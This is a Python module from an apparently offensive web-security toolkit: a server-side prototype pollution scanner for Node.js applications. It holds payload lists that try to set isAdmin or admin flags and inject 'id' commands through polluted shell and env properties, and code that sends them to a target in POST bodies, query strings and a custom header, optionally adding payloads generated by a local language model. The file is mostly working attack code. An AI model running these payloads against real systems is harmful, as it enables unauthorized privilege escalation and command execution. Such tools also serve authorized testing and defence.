import json
import requests
from urllib.parse import urlparse, urlencode, parse_qs
from utils.output import section, info, success, warning, error, result, table
from utils.ollama_helper import OllamaHelper

JSON_PAYLOADS = [
    '{"__proto__": {"isAdmin": true}}',
    '{"__proto__": {"admin": true}}',
    '{"__proto__": {"polluted": true}}',
    '{"constructor": {"prototype": {"isAdmin": true}}}',
    '{"constructor": {"prototype": {"admin": true}}}',
    '{"__proto__": {"__proto__": {"isAdmin": true}}}',
    '{"a": {"__proto__": {"isAdmin": true}}}',
    '{"__proto__": {"status": 200, "body": "INJECTED"}}',
    '{"__proto__": {"shell": "id"}}',
    '{"__proto__": {"env": {"CMD": "id"}}}',
]

QS_PAYLOADS = [
    "__proto__.isAdmin=true",
    "__proto__.admin=true",
    "__proto__.polluted=true",
    "constructor.prototype.isAdmin=true",
    "constructor.prototype.admin=true",
    "__proto__[isAdmin]=true",
    "__proto__[admin]=true",
    "a.__proto__.isAdmin=true",
    "a.__proto__.polluted=true",
]

HEADER_PAYLOADS = [
    '{"__proto__": {"isAdmin": true}}',
    '{"__proto__": {"admin": true}}',
]

POLLUTION_TAGS = ["isAdmin", "INJECTED", "polluted", "true"]


class PrototypePollution:
    name = "proto-pollution"
    description = "Server-side prototype pollution scanner for Node.js applications"

    @staticmethod
    def run(target, params="", method="GET", data="", timeout=10, ollama_model=None):
        section(f"Server-Side Prototype Pollution Scanner: {target}")

        ollama = OllamaHelper(model=ollama_model) if ollama_model else None
        results = {"target": target, "vulnerabilities": [], "total_tests": 0, "findings": 0}
        all_vulns = []

        if not target.startswith(("http://", "https://")):
            target = f"https://{target}"

        test_params = [p.strip() for p in params.split(",") if p.strip()] if params else []
        if not test_params:
            parsed = urlparse(target)
            qs = parse_qs(parsed.query)
            test_params = list(qs.keys())
            if not test_params:
                test_params = ["user", "config", "settings", "data", "body", "json", "payload", "params", "options"]

        all_json_payloads = list(JSON_PAYLOADS)
        all_qs_payloads = list(QS_PAYLOADS)

        if ollama and ollama.available:
            ai_payloads = ollama.generate_prototype_pollution_payloads("express")
            if ai_payloads:
                seen = set(all_json_payloads + all_qs_payloads)
                for p in ai_payloads:
                    if p not in seen:
                        all_json_payloads.append(p)
                        seen.add(p)
                info(f"AI contributed {len(ai_payloads)} payloads")

        original_body_len = None

        # Get baseline response
        try:
            base_resp = requests.get(target, timeout=timeout,
                headers={"User-Agent": "Mozilla/5.0"})
            original_body_len = len(base_resp.text)
        except:
            pass

        # Test 1: JSON body injection via POST
        if method.upper() == "POST" or data:
            info("Testing POST JSON body prototype pollution...")
            for json_payload in all_json_payloads:
                results["total_tests"] += 1
                try:
                    try:
                        body_data = json.loads(json_payload)
                    except json.JSONDecodeError:
                        continue

                    resp = requests.post(target, json=body_data, timeout=timeout,
                        headers={
                            "User-Agent": "Mozilla/5.0",
                            "Content-Type": "application/json",
                        },
                        allow_redirects=False)

                    resp_text = json.dumps(resp.text) if isinstance(resp.text, str) else resp.text
                    for tag in POLLUTION_TAGS:
                        if isinstance(resp_text, str) and tag.lower() in resp_text.lower():
                            all_vulns.append({
                                "type": "JSON_BODY_PROTO_POLLUTION",
                                "payload": json_payload,
                                "evidence": f"Response contains '{tag}'",
                                "status_code": resp.status_code,
                            })
                            results["findings"] += 1
                            success(f"[JSON_BODY] Pollution payload reflected: {json_payload[:60]}... ({resp.status_code})")
                            break

                except requests.exceptions.RequestException:
                    pass
                except Exception:
                    pass

        # Test 2: Query string prototype pollution
        info("Testing query string prototype pollution...")
        for qs_payload in all_qs_payloads:
            results["total_tests"] += 1
            try:
                sep = "?" if "?" not in target else "&"
                test_url = f"{target}{sep}{qs_payload}"

                resp = requests.get(test_url, timeout=timeout,
                    headers={"User-Agent": "Mozilla/5.0"},
                    allow_redirects=False)

                for tag in POLLUTION_TAGS:
                    if tag.lower() in resp.text.lower():
                        all_vulns.append({
                            "type": "QS_PROTO_POLLUTION",
                            "payload": qs_payload,
                            "evidence": f"Response contains '{tag}'",
                            "status_code": resp.status_code,
                        })
                        results["findings"] += 1
                        success(f"[QS_POLLUTION] {qs_payload} reflected ({resp.status_code})")
                        break

                # Check if response differs from baseline
                if original_body_len and abs(len(resp.text) - original_body_len) > 50:
                    if resp.status_code == 200:
                        all_vulns.append({
                            "type": "QS_PROTO_POLLUTION_SIZE",
                            "payload": qs_payload,
                            "evidence": f"Response size changed: {original_body_len} -> {len(resp.text)}",
                            "status_code": resp.status_code,
                        })
                        results["findings"] += 1
                        warning(f"[QS_POLLUTION_SIZE] {qs_payload} changed response size ({original_body_len} -> {len(resp.text)})")

            except requests.exceptions.RequestException:
                pass
            except Exception:
                pass

        # Test 3: Header-based prototype pollution
        info("Testing header-based prototype pollution...")
        for header_payload in HEADER_PAYLOADS:
            results["total_tests"] += 1
            try:
                resp = requests.get(target, timeout=timeout,
                    headers={
                        "User-Agent": "Mozilla/5.0",
                        "X-Prototype-Pollution": header_payload,
                    },
                    allow_redirects=False)

                for tag in POLLUTION_TAGS:
                    if tag.lower() in resp.text.lower():
                        all_vulns.append({
                            "type": "HEADER_PROTO_POLLUTION",
                            "payload": header_payload,
                            "evidence": f"Response contains '{tag}'",
                            "status_code": resp.status_code,
                        })
                        results["findings"] += 1
                        success(f"[HEADER_POLLUTION] X-Prototype-Pollution header reflected ({resp.status_code})")
                        break

            except requests.exceptions.RequestException:
                pass
            except Exception:
                pass

        if all_vulns:
            result("Total vulnerabilities found", str(len(all_vulns)))

            table(["Type", "Payload", "Evidence", "Status"], [
                [v["type"], v["payload"][:50], v["evidence"][:40], str(v["status_code"])] for v in all_vulns[:20]
            ])

            if len(all_vulns) > 20:
                info(f"... and {len(all_vulns) - 20} more findings")
        else:
            warning("No prototype pollution vulnerabilities detected")

        results["vulnerabilities"] = all_vulns
        return results
